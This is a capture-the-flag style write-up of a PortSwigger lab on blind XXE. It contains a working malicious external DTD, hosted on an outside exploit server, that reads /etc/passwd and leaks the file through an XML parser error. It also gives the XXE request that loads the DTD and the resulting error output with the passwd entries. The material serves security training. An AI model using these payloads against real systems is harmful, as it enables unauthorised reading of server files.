# [Lab: Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

## Lab

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the  `/etc/passwd`  file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

## Analysis

check stock request:

```http
POST /product/stock HTTP/1.1
Content-Length: 107
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

the body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```

## tools

- burpsuite scanner: detected `Issue:Â External service interaction (HTTP)`

## Solutions

craft a malicious DTD at exploit-server/exploit.dtd:

  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; errorforsure SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %errorforsure;
  ```

- `eval`: dynamic declaration of the errorforsure entity
- `%eval`: perform dynamic declaraction of errorforsure entity
- dynamic declaraction:
  - `&#x25;` => `%`
  - `%file;` => content of `"file:///etc/passwd"`

xxe:

```xml
<?xml version="1.0" encoding="UTF-8" standalone='no'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-id.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

=> response:

```text
"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```
